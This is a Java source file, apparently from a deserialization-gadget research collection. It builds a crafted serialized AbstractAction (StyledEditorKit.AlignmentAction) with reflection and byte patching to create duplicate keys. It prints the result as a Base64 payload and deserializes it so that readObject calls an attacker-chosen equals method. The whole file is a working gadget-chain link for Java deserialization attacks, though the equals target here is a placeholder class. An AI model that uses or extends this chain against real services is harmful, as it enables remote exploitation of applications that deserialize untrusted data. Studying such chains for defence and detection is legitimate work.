package com.xiinnn.readobject2equals;

import com.xiinnn.template.EqualsClass;

import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

// AbstractAction#readObject -> equals
public class AbstractActionReadObject2Equals {
    public static void main(String[] args) throws Exception{
        EqualsClass equalsClass = new EqualsClass();

        StyledEditorKit.AlignmentAction action = new StyledEditorKit.AlignmentAction("", 0);
        setFieldValue(action, "changeSupport", new SwingPropertyChangeSupport(""));

        action.putValue("fff123", "");
        action.putValue("aff123", "");

        Field arrayTableField = getField(AbstractAction.class, "arrayTable");
        Object arrayTable = arrayTableField.get(action);

        Field tableField = getField(arrayTable.getClass(), "table");
        Object[] table1 = (Object[])tableField.get(arrayTable);
        table1[1] = "useless";
        table1[3] = equalsClass;
        tableField.set(arrayTable, table1);

        byte[] bytes = serialize(action);

        // 把 aff123 改成 fff123
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 97 && bytes[i+1] == 102 && bytes[i+2] == 102
                    && bytes[i+3] == 49 && bytes[i+4] == 50 && bytes[i+5] == 51){
                bytes[i] = 102;
                break;
            }
        }
        System.out.println(new String(Base64.getEncoder().encode(bytes)));
        // 反序列化成功调用 EqualsClass#equals
        unserialize(bytes);
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
